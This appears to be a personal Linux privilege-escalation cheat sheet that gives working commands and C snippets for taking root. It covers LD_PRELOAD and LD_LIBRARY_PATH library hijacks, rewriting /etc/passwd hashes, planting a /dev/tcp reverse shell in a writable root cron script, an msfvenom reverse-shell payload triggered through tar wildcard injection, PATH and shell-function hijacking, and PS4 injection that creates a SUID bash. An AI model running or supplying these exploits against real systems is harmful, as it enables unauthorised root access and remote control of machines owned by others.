[*] create a new shadow password hash
    mkpasswd -m sha-512 newpasswordhere

[*] Create a new password hash for /etc/passwd
	openssl passwd newpasswordhere
    Example /etc/passwd update:
	root:Y23zFXfGfz7rY:0:0:root:/root:/bin/bash

[*] Common tool, use GTFObins
	https://gtfobins.github.io/gtfobins/

[*] If sudo -l shows nv_keep+=LD_PRELOAD and env_keep+=LD_LIBRARY_PATH, then we can jump into root shell:

- File preload.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

- Now run:
	gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
	sudo LD_PRELOAD=/tmp/preload.so /sudo/command


[*] apache2 example. apache2 is in our sudoers file approved commands, but no bin escape. Create one by changing a shared library. Check shared libraries:
	ldd /usr/sbin/apache2

- File library_path.c:

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

- Compile:
	gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
	sudo LD_LIBRARY_PATH=/tmp apache2


[*] Cronjobs - check for files that are ran as root and if the files are writeable:

	find / -type f -name nameoffile -exec ls -alh {} \; 2>/dev/null
	vim /path/to/nameoffile
	/bin/bash -i >& /dev/tcp/10.10.10.10/1337 0>&1

 - Set up a local netcat listener:
	nc -lvnp 1337

[*] Check crontab for PATH:
	PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

- Now check commands and scripts. If any commands do not have a full path, the first place checked is in PATH.
- Example of script:

- Command "tar", create the file "tar" in /home/user:
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

- The file will appear
	/tmp/rootbash -p

[*] GTFOBin for "tar" command that has a asterisk, "*", can be manipulated with a reverse shell:
	msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
	chmod 755 shell.elf
	scp shell.elf user@10.10.10.1:/home/user/ # Asuming this is where the asterisk is ran
- Create two files in the directory where the asterisk is running:
	touch /home/user/--checkpoint=1
	touch /home/user/--checkpoint-action=exec=shell.elf
- Open the netcat listener on attacker machine or localhost as configured in msfvenom - then wait for for the cron to run


[*] Simple c file for running a shell if a command is not using full path:

int main() {
        setuid(0);
        system("/bin/bash -p");
}

- Run the command where you built your file:
	PATH=.:$PATH /usr/local/bin/command

[*] Abuse shell features by using functions. If a command is using the full path, turn it into a function and remove the actual command
	function /usr/sbin/service { /bin/bash -p; }
	export -f /usr/sbin/service

- Run the command


[*] Bash versions under 4 allow to set PS4 - Bash debugging. Abuse it:
	env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/command
	/tmp/rootbash -p


